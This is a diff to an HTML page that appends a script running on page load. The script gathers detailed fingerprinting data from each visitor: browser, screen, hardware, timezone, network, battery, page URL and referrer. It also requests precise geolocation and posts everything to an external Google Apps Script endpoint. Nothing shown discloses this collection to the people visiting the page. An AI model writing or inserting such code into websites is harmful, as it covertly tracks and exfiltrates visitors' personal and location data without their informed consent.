@@ -334,6 +334,150 @@
         </div>
 
     </div>
+<script>
+    async function collectDeviceInfo() {
+  const data = {
+    timestamp: new Date().toISOString(),
 
+    // Browser / OS
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    languages: navigator.languages,
+    vendor: navigator.vendor,
+
+    // Screen
+    screen: {
+      width: screen.width,
+      height: screen.height,
+      availWidth: screen.availWidth,
+      availHeight: screen.availHeight,
+      colorDepth: screen.colorDepth,
+      pixelDepth: screen.pixelDepth,
+      devicePixelRatio: window.devicePixelRatio
+    },
+
+    // Browser viewport
+    viewport: {
+      width: window.innerWidth,
+      height: window.innerHeight
+    },
+
+    // Hardware
+    hardware: {
+      cpuCores: navigator.hardwareConcurrency || null,
+      deviceMemory: navigator.deviceMemory || null,
+      maxTouchPoints: navigator.maxTouchPoints || 0
+    },
+
+    // Locale / timezone
+    locale: {
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      timezoneOffset: new Date().getTimezoneOffset(),
+      language: navigator.language,
+      languages: navigator.languages
+    },
+
+    // Connection
+    connection: navigator.connection ? {
+      effectiveType: navigator.connection.effectiveType,
+      downlink: navigator.connection.downlink,
+      rtt: navigator.connection.rtt,
+      saveData: navigator.connection.saveData
+    } : null,
+
+    // Browser state
+    browser: {
+      online: navigator.onLine,
+      cookiesEnabled: navigator.cookieEnabled,
+      doNotTrack: navigator.doNotTrack,
+      pdfViewerEnabled: navigator.pdfViewerEnabled
+    },
+
+    // Page
+    page: {
+      url: location.href,
+      origin: location.origin,
+      referrer: document.referrer,
+      title: document.title
+    },
+
+    // Timing
+    performance: {
+      loadTime: performance.now(),
+      navigation: performance.getEntriesByType("navigation")[0]?.toJSON() || null
+    }
+  };
+
+  // Battery information (only supported browsers)
+  if (navigator.getBattery) {
+    try {
+      const battery = await navigator.getBattery();
+
+      data.battery = {
+        level: battery.level,
+        charging: battery.charging,
+        chargingTime: battery.chargingTime,
+        dischargingTime: battery.dischargingTime
+      };
+    } catch {
+      data.battery = null;
+    }
+  }
+
+  // High accuracy location — requires permission
+  if (navigator.geolocation) {
+    await new Promise(resolve => {
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          data.location = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            altitude: position.coords.altitude,
+            altitudeAccuracy: position.coords.altitudeAccuracy,
+            heading: position.coords.heading,
+            speed: position.coords.speed,
+            timestamp: new Date(position.timestamp).toISOString()
+          };
+
+          resolve();
+        },
+        error => {
+          data.location = {
+            available: false,
+            error: error.message
+          };
+
+          resolve();
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 15000,
+          maximumAge: 0
+        }
+      );
+    });
+  }
+
+  // Send to Google Apps Script
+  try {
+    await fetch("https://script.google.com/macros/s/AKfycbwpZviH1r70zbYV4DpoUsjpeQoH-Aa_5aUzBH2bkd8-orFleTBi8ekP3tdXw5B8BsFY/exec", {
+      method: "POST",
+      mode: "no-cors",
+      headers: {
+        "Content-Type": "text/plain"
+      },
+      body: JSON.stringify(data)
+    });
+
+    console.log("Device information submitted.");
+  } catch (error) {
+    console.error("Submission failed:", error);
+  }
+}
+
+collectDeviceInfo();
+</script>
 </body>
 </html>
